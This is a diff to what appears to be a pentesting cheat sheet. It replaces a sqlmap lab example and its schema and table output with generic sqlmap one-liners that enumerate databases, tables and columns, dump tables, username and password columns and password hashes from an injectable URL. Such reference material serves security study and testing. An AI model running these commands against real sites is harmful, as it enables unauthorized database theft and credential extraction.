@@ -76,75 +76,30 @@ Brute force:
   --common-files      Check existence of common files
 ```
 
-```
-// Enumerate database management system schema
-$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
+```shellscript
+# Basic automated scan from a URL
+sqlmap -u "http://example.com/vuln.php?id=1" --dbs --batch
 
-[...]
-Database: owasp10
-Table: accounts
-[4 columns]
-+-------------+---------+
-| Column      | Type    |
-+-------------+---------+
-| cid         | int(11) |
-| mysignature | text    |
-| password    | text    |
-| username    | text    |
-+-------------+---------+
+# List tables of a specific database
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name --tables --batch
 
-Database: owasp10
-Table: blogs_table
-[4 columns]
-+--------------+----------+
-| Column       | Type     |
-+--------------+----------+
-| date         | datetime |
-| blogger_name | text     |
-| cid          | int(11)  |
-| comment      | text     |
-+--------------+----------+
+# List columns of a specific table
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --columns --batch
 
-Database: owasp10
-Table: hitlog
-[6 columns]
-+----------+----------+
-| Column   | Type     |
-+----------+----------+
-| date     | datetime |
-| browser  | text     |
-| cid      | int(11)  |
-| hostname | text     |
-| ip       | text     |
-| referer  | text     |
-+----------+----------+
+# Dump the contents of a specific table
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --dump --batch
 
-Database: testdb
-Table: users
-[3 columns]
-+---------+---------------+
-| Column  | Type          |
-+---------+---------------+
-| id      | int(11)       |
-| name    | varchar(500)  |
-| surname | varchar(1000) |
-+---------+---------------+
-[...]
+# Dump only specific columns
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name -C username,password --dump --batch
 
-// Dump database table entries
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
-[...]
-Database: Firebird_masterdb
-Table: USERS
-[4 entries]
-+----+--------+------------+
-| ID | NAME   | SURNAME    |
-+----+--------+------------+
-| 1  | luther | blisset    |
-| 2  | fluffy | bunny      |
-| 3  | wu     | ming       |
-| 4  | NULL   | nameisnull |
-+----+--------+------------+
+# Dump with a WHERE condition
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name -T table_name --where="id < 10" --dump --batch
+
+# Dump everything in a specific database
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name --dump-all --batch
+
+# Dump in-memory password hashes
+sqlmap -u "http://example.com/vuln.php?id=1" --passwords --batch
 ```
 
 ### Tools
